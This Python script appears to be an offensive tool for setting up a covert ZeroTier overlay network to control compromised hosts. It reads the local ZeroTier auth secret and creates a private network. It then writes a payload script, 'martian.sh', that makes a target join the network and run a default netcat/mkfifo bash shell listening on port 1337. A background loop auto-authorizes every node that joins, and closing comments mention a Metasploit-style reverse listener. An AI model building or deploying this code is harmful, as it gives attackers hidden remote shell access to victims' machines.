import subprocess
import requests
import json
import os
import threading
import base64
import time
from logger import logger
from termcolor import colored

# Initiates logging object
log = logger()

# Collects information about local zerotier instance
os.environ['TOKEN'] = subprocess.check_output('sudo cat /var/lib/zerotier-one/authtoken.secret', shell=True, text=True).strip()
os.environ['NODEID'] = subprocess.check_output('sudo bin/zerotier-cli info | cut -d " " -f 3', shell=True, text=True).strip()

# Creates network and assigns IP rangee
headers = {
    'X-ZT1-AUTH': os.getenv('TOKEN', ''),
    'Content-Type': 'application/x-www-form-urlencoded',
}

payload = {
        "ipAssignmentPools": [{"ipRangeStart": "10.10.10.1", "ipRangeEnd": "10.10.10.254"}],
        "routes": [{"target": "10.10.10.0/24", "via": None}],
        "v4AssignMode": "zt",
        "private": True
    }

response = requests.post(
    'http://localhost:9993/controller/network/' + os.getenv('NODEID', '') + '______',
    headers=headers,
    json=payload
)

print(response, response.text)
log.print_success('New network created')

# Joins self to network

d = json.loads(response.text)
# This is what any node joining the network needs to have
os.environ['NWID'] = d.get('id')

os.system(f'sudo zerotier-cli join {os.environ["NWID"]}')

log.print_success('Joined local node to network')
# Authorizes self on network

headers = {
    'X-ZT1-AUTH': os.getenv('TOKEN', ''),
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = '{"authorized": true}'

response = requests.post(
    'http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member/' + os.getenv('NODEID', ''),
    headers=headers,
    data=data,
)

print(response, response.text)
log.print_success('Authorized self')

time.sleep(5)

# Get info about self on new network

headers = {
    'X-ZT1-AUTH': os.getenv('TOKEN', ''),
}

response = requests.get(
    'http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member/' + os.getenv('NODEID', ''),
    headers=headers,
)

print(response, response.text)

# Get local IP for reference
d = json.loads(response.text)
local_ip = d.get('ipAssignments')[0]
print(f'local IP: {local_ip}')

command_default = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 1337 > /tmp/f'
print(f'Default command on setup: "{command_default}"')
command = input(f'Enter command to run or [Enter for default]:\t')
if command:
    command_default = command

script = open('scripts/martian_template.sh').readlines()

with open('prod/martian.sh', 'w') as f:
        for line in script:
            f.write(line)  
        f.write(f'\nsudo ./zerotier-cli join {os.environ["NWID"]}\n')
        f.write(command_default)
log.print_general('Script written to prod/martian.sh')


# Start trying to authorize new members

def authenticate_new_members():
    authorized_nodes = [os.environ['NODEID']]
    while True:
        # Gets all nodes currently on the network
        headers = {
            'X-ZT1-AUTH': os.getenv('TOKEN', ''),
        }
        response = requests.get('http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member', headers=headers)
        nodes = json.loads(response.text)
        # Iterate through each node, authorizing it and adding to the list of authorized nodes
        for key in nodes:
            if(not key in authorized_nodes):
                headers = {
                'X-ZT1-AUTH': os.getenv('TOKEN', ''),
                'Content-Type': 'application/x-www-form-urlencoded',
                }
                data = '{"authorized": true}'
                response = requests.post(
                    'http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member/' + key,
                    headers=headers,
                    data=data,
                )
                log.print_success(f'Attempted to authorie new node {key}')
                authorized_nodes.append(key)
    time.sleep(5)


thr = threading.Thread(target=authenticate_new_members)
thr.start()
log.print_general('Attempting to authenticate new members...')

# Next, start reverse listener on MFSConsole

# After that, start trying to authenticate new hosts every 4 seconds